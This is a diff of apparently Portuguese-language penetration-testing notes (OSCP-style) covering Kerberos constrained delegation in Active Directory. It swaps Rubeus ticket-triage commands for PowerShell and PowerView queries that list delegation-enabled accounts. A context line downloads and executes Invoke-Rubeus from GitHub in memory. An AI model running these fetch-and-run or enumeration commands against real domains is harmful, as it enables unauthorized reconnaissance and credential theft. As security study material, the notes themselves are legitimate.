@@ -1413,16 +1413,37 @@ curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeu
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Rubeus.ps1")
 ```
 
-##### CONSTRAINED DELEGATION RUBEUS - LIST TICKETS
+##### CONSTRAINED DELEGATION RUBEUS - FIND COMPUTERS AND USERS WITH CONSTRAINED DELEGATION
+ENCONTRAR APENAS COMPUTADORES
 ```
-.\Rubeus.exe triage
-.\Rubeus.exe triage /user:administrator
-.\Rubeus.exe triage /luid:0xd62d4
+$FormatEnumerationLimit=-1
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
 ```
+ENCONTRAR COMPUTADORES E USUARIOS
 ```
-Invoke-Rubeus triage
-Invoke-Rubeus 'triage'
+$FormatEnumerationLimit=-1
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 ```
+ENCONTRAR APENAS COMPUTADORES (POWERVIEW)
+```
+$FormatEnumerationLimit=-1
+Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
+Get-DomainComputer -TrustedToAuth
+```
+ENCONTRAR APENAS USUARIOS (POWERVIEW)
+```
+$FormatEnumerationLimit=-1
+Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
+Get-DomainUser -TrustedToAuth
+```
+
+
+
+
+
 
 
 
